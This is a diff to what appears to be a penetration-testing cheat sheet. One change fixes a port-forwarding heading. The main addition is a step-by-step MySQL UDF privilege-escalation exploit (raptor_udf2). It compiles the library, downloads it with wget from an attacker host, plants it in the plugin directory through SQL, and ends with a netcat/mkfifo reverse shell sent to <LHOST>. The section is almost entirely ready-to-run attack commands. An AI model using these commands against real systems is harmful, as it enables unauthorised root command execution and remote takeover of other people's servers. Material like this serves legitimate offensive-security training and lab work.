@@ -465,7 +465,7 @@ C:\> plink.exe -N -R <LPORT>:127.0.0.1:<RPORT> -P 22 <RHOST>
 
 ##
 
-### Port Forwarding w/NETSH.exe | Windows**
+### Port Forwarding w/NETSH.exe | Windows
 
 **Establish connection:**
 
@@ -747,11 +747,46 @@ Check exploits for running services:
 # ps aux | grep <USER>
 # ps aux | grep root
 ```
+##
+
+**MySQL Exploitation *(4.x/5.0)***
 
 Always check MySQL version *(if applicable)* for **RAPTOR** exploit:
 
 ```
 # mysql -V
+```
+
+**Compiling & preparing the exploit *(raptor_udf2.c)***
+
+Compile:
+
+```
+# gcc -g -c raptor_udf2.c
+# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+Transfer & Prepare:
+
+```
+# cd /tmp && wget http://<LHOST>:<LPORT>/raptor_udf2.so
+# wget http://<LHOST>:<LPORT>/raptor_udf2.o
+# mysql -u root -p
+# <PASSWORD>
+
+mysql > use mysql;
+mysql > SHOW VARIABLES LIKE 'datadir';             <- Locate where the plugin files are (we need it to create exploitation function)
+mysql > CREATE TABLE potato(line blob);
+mysql > INSERT INTO potato VALUES(load_file('/tmp/raptor_udf2.so'));
+mysql > SELECT * FROM potato into dumpfile '/path_to_plugins_directory/raptor_udf2.so';
+mysql > CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';    <- If you get an error (errno: 11) at this point, that means you need to repeat the previous step with different MySQL location, e.g. /usr/lib/mysql/raptor_udf2.so or /usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so
+mysql > SELECT * FROM mysql.func;                  <- sanity check
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function |
++-----------+-----+----------------+----------+
+mysql > select do_system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f');
 ```
 
 ##
